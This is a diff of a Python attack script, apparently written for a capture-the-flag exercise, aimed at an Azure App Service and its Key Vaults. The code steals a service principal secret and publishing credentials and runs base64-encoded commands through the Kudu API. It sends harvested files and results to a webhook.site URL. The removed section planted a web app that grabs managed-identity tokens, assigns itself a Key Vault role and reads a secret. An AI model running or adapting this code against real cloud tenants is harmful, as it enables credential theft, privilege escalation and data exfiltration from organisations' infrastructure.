@@ -5,7 +5,7 @@ import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceba
 TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
 def out(x):
  s=json.dumps(x,default=str); print(s,flush=True)
- if x.get('stage') not in ('flag','app-flag','kudu-result','kudu-diag','app-error','worker-error','app-top-error','outer-error'): return
+ if x.get('stage') not in ('flag','app-flag','kudu-result','kudu-files','kudu-diag','app-error','worker-error','app-top-error','outer-error'): return
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
  except Exception: pass
 def j(url,tok):
@@ -24,51 +24,30 @@ try:
  sp=json.loads(j(KV1+'/secrets/reporting-service-principal?api-version=7.4',vt)['value']); sid=sp.get('appId') or sp.get('clientId') or sp.get('client_id'); sec=sp.get('clientSecret') or sp.get('client_secret') or sp.get('password')
  arm=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://management.azure.com/.default'})['access_token']
  pub=json.loads(urllib.request.urlopen(urllib.request.Request('https://management.azure.com/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',data=b'{}',method='POST',headers={'Authorization':'Bearer '+arm,'Content-Type':'application/json'}),timeout=30).read()); p=pub['properties']; auth='Basic '+base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode(); base='https://'+APP+'.scm.azurewebsites.net'; out({'stage':'credentials','oidc':True,'arm':True,'kudu':True})
- # Write a lazy probe app, restart via ARM, then call it once from the runner.
- app_code=r'''from flask import Flask
-import os,json,urllib.parse,urllib.request,urllib.error,uuid
-app=Flask(__name__)
-SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"; CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"; PRINCIPAL="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
-def tok(resource):
- e=dict(os.environ); ep=e.get("IDENTITY_ENDPOINT") or e.get("MSI_ENDPOINT"); hd={}
- if e.get("IDENTITY_HEADER"): hd["X-IDENTITY-HEADER"]=e["IDENTITY_HEADER"]
- if e.get("MSI_SECRET"): hd["Secret"]=e["MSI_SECRET"]
- eps=[x for x in [ep,"http://127.0.0.1:41741/MSI/token","http://127.0.0.1:8081/msi/token","http://169.254.131.3:8081/msi/token","http://169.254.131.12:8081/msi/token"] if x]
- errs=[]
- for x in eps:
-  for q in ("&client_id="+CLIENT,"&mi_res_id="+urllib.parse.quote(MIRES,safe=""),""):
-   try:
-    u=x+"?resource="+urllib.parse.quote(resource,safe="")+"&api-version=2019-08-01"+q; d=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers=hd),timeout=1.5).read())
-    if d.get("access_token"): return d["access_token"],x
-    errs.append(str(d)[:160])
-   except Exception as z: errs.append(repr(z))
- try:
-  u="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource="+urllib.parse.quote(resource,safe="")+"&client_id="+CLIENT; d=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"Metadata":"true"}),timeout=1.5).read()); return d["access_token"],"169.254.169.254"
- except Exception as z: errs.append(repr(z))
- raise RuntimeError("MI unavailable: "+" | ".join(errs[-8:]))
-def outj(x): return json.dumps(x,default=str),200,{"Content-Type":"application/json"}
-@app.route("/__ctf_probe")
-def probe():
- try:
-  at,ae=tok("https://management.azure.com"); scope="subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"; ra="https://management.azure.com/"+scope+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"; body={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":PRINCIPAL,"principalType":"ServicePrincipal"}}; rr=urllib.request.urlopen(urllib.request.Request(ra,data=json.dumps(body).encode(),method="PUT",headers={"Authorization":"Bearer "+at,"Content-Type":"application/json"}),timeout=8); rs=rr.status
-  vt,ve=tok("https://vault.azure.net"); fr=urllib.request.urlopen(urllib.request.Request("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",headers={"Authorization":"Bearer "+vt}),timeout=8); return outj({"stage":"flag","endpoint":ae,"role_status":rs,"flag_status":fr.status,"flag":fr.read().decode()[:12000]})
- except urllib.error.HTTPError as e:
-  return outj({"stage":"probe-error","status":e.code,"body":e.read().decode()[:4000]})
- except Exception as e: return outj({"stage":"probe-error","error":repr(e)})
-'''.replace('\n','\n')
- b64=base64.b64encode(app_code.encode()).decode()
- worker="python3 -c \"import base64;open('/home/site/wwwroot/app.py','wb').write(base64.b64decode('"+b64+"'))\""
- body=json.dumps({'command':worker,'dir':'site/wwwroot'})
+ # Inventory the shared wwwroot and startup files from Kudu.
+ worker=r'''import os,json,urllib.request
+HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"
+root='/home/site/wwwroot'; files=[]; texts={}
+for dp,dn,fn in os.walk(root):
+ for f in fn:
+  p=os.path.join(dp,f)
+  try:
+   sz=os.path.getsize(p); rel=p[len(root)+1:]; files.append({'path':rel,'size':sz})
+   if sz<20000 and (f.endswith(('.py','.sh','.json','.txt','.ini','.cfg')) or 'startup' in f.lower() or 'gunicorn' in f.lower()):
+    try: texts[rel]=open(p,errors='replace').read()[:6000]
+    except Exception: pass
+  except Exception: pass
+d={'stage':'kudu-files','files':files[:500],'texts':texts}
+try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(d,default=str).encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
+except Exception: pass
+print(json.dumps(d,default=str),flush=True)
+'''
+ b64=base64.b64encode(worker.encode()).decode()
+ cmd="python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\""
+ body=json.dumps({'command':cmd,'dir':'site/wwwroot'})
  try:
   rr=urllib.request.urlopen(urllib.request.Request(base+'/api/command',data=body.encode(),method='POST',headers={'Authorization':auth,'Content-Type':'application/json'}),timeout=35); out({'stage':'kudu-result','status':rr.status,'body':rr.read().decode('utf-8','replace')[:2000]})
  except Exception as e: out({'stage':'kudu-result','error':repr(e)})
- try:
-  restart_url='https://management.azure.com/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/restart?api-version=2023-01-01'; rr=urllib.request.urlopen(urllib.request.Request(restart_url,data=b'',method='POST',headers={'Authorization':'Bearer '+arm}),timeout=30); out({'stage':'arm-restart','status':rr.status})
- except Exception as e: out({'stage':'arm-restart','error':repr(e)})
- time.sleep(20)
- try:
-  rr=urllib.request.urlopen(urllib.request.Request('https://'+APP+'.azurewebsites.net/__ctf_probe'),timeout=25); out({'stage':'app-probe','status':rr.status,'body':rr.read().decode('utf-8','replace')[:14000]})
- except Exception as e: out({'stage':'app-probe','error':repr(e)})
  raise SystemExit(0)
  app=r'''import os,json,time,uuid,urllib.parse,urllib.request,urllib.error,traceback
 HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"; MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"; CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"; PRINCIPAL="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
